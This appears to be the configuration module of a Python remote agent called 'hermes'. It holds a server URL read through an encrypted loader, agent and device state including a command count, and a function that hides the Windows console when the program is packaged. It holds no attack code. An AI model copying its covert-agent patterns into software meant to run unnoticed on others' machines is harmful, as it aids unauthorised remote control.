# -*- coding: utf-8 -*-
"""
hermes.config — 全局配置 + 共享状态
所有模块从这里读取配置，写入状态队列。
版本: 1.0
"""
__version__ = "1.0"

import os, sys, threading, queue

# ── 版本 ──
VERSION = "3.5"

# ── 网络 ──
try:
    from crypto_loader import get_config
    SERVER_URL = get_config("SERVER_URL", "")
except ImportError:
    SERVER_URL = os.environ.get("HERMES_SERVER_URL", "")
MODULES_JSON = "modules/modules.json"
API_KEY = os.environ.get("CHAT_API_KEY", "")

# 启动时检查：API_KEY 为空或使用默认值时发出警告
_DEFAULT_API_KEY = ""
if not API_KEY:
    import warnings as _warnings
    _warnings.warn("[WARN] CHAT_API_KEY not set, connecting without key")
elif API_KEY == _DEFAULT_API_KEY:
    import warnings as _warnings
    _warnings.warn("[WARN] Using default API_KEY, set CHAT_API_KEY env var")

# ── Agent 状态（线程共享） ──
agent_status = {
    "connected": False,
    "device_name": "",
    "device_id": "",
    "ip": "",
    "cmds": 0,
    "errors": 0,
    "last_error": "",
    "uptime": 0,
}
agent_log_queue = queue.Queue(maxsize=100)
chat_system_queue = queue.Queue(maxsize=50)
update_queue = queue.Queue(maxsize=5)

# ── 设备列表缓存 ──
devices_cache = {"devices": {}, "device_ids": [], "updated": 0}
devices_lock = threading.Lock()


def get_base_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def hide_console():
    if sys.platform == 'win32':
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                if getattr(sys, "frozen", False):
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                else:
                    ctypes.windll.user32.ShowWindow(hwnd, 6)
        except:
            pass
